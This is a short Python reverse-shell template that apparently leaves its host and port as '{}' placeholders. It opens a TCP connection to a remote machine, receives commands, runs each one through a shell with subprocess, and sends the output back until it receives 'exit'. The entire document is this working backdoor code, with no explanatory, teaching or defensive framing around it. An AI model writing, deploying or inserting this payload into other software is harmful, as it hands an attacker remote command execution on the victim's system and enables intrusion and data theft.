import socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{}", {}))
while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == "exit": break
    output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    s.send(output.stdout.encode() + output.stderr.encode())
s.close()
